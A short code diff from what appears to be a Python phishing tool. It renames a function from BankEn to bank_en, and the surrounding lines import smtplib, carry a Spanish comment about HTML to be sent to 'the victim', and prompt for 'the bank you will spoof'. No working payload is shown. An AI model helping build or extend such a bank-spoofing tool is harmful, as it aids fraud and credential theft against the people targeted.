@@ -4,7 +4,7 @@ import sys
 import smtplib
 from helper.helper import getPath,get_input_en
 
-def BankEn():
+def bank_en():
     get_input_en()
     ##HTML que se enviara a la victima
     bank = input("Enter the bank you will spoof-->")
